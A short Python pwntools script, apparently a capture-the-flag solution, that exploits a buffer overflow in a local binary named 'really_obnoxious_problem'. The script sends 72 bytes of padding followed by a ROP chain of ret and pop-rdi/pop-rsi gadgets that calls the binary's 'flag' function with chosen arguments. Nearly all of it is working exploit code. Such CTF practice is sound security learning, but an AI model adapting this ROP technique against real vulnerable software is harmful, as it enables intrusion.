from pwn import *


context.log_level='info'
context.terminal=["konsole", "-e"]

p = process("./really_obnoxious_problem")
e = ELF("./really_obnoxious_problem")

gdb.attach(p)

p.sendlineafter(":", "bobby")

ret = 0x000000000040101a

poprdi = 0x00000000004013f3
poprsi_r15 = 0x00000000004013f1


p.sendlineafter(":", "B"*72 + p64(ret) + p64(poprdi) + p64(0x1337) + p64(poprsi_r15) + p64(e.sym["name"]) + p64(0) + p64(ret) + p64(e.sym["flag"]))

p.interactive()
